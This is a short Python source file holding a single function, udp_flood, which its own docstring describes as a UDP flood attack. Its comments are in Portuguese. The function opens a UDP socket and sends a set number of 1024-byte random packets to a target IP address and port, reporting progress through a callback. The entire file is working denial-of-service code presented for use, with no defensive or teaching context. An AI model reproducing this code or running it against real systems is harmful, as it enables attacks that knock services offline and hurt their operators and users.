import socket
import random

def udp_flood(target_ip, target_port, duration_packets, callback=None):
    """
    Perform a UDP flood attack on target IP and port.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        duration_packets: Number of packets to send
        callback: Optional function to call for progress updates
        
    Returns:
        Number of packets sent
    """
    # Criamos um socket UDP (SOCK_DGRAM)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Geramos bytes aleatórios para o payload (ex: 1024 bytes)
    bytes_payload = random._urandom(1024)
    
    if callback:
        callback(f"--- A iniciar UDP Flood em {target_ip}:{target_port} ---")
    
    sent = 0
    try:
        while sent < duration_packets:
            # Enviamos o pacote para o IP e Porto alvo
            client.sendto(bytes_payload, (target_ip, target_port))
            sent += 1
            if sent % 100 == 0 and callback:
                callback(f"Pacotes enviados: {sent}/{duration_packets}")
    except KeyboardInterrupt:
        if callback:
            callback("Flood interrompido pelo utilizador")
    except Exception as e:
        if callback:
            callback(f"Erro: {str(e)}")
    finally:
        client.close()
    
    return sent